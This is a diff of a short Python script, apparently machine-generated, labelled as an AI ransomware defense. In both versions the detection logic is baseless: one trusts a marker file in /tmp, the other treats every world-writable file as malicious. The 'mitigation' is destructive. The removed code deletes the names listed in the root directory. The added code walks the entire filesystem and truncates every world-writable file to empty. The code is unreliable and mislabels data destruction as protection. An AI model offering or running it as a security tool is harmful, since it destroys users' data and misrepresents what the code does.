@@ -1,35 +1,26 @@
 #!/usr/bin/env python3
 # Nobab AI defense for ransomware
-# Generated 2026-07-23 08:17:32.203331
+# Generated 2026-07-23 11:06:49.256731
 
 import os
-import sys
+import stat
 import time
 
-def detect_ransomware():
-    # Check if the system is infected with ransomware
-    if os.path.exists('/tmp/.ransomware'):
+def is_ransomware(filepath):
+    file_info = os.stat(filepath)
+    if file_info.st_mode & stat.S_IWOTH:
         return True
     else:
         return False
 
-def mitigate_ransomware(infected_files):
-    # Remove all infected files
-    for file in infected_files:
-        try:
-            os.remove(file)
-        except OSError as e:
-            print("Error while removing file {}".format(e))
+def mitigate_ransomware(filepath):
+    with open(filepath, "w") as f:
+        f.write("")
+    os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)
+    time.sleep(10)
 
-def main():
-    # Check if the system is infected with ransomware
-    if detect_ransomware():
-        # Get a list of all infected files
-        infected_files = os.listdir('/')
-        # Mitigate the ransomware attack by removing all infected files
-        mitigate_ransomware(infected_files)
-    else:
-        print("The system is not infected with ransomware")
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    for root, dirs, files in os.walk("/"):
+        for file in files:
+            if is_ransomware(os.path.join(root, file)):
+                mitigate_ransomware(os.path.join(root, file))
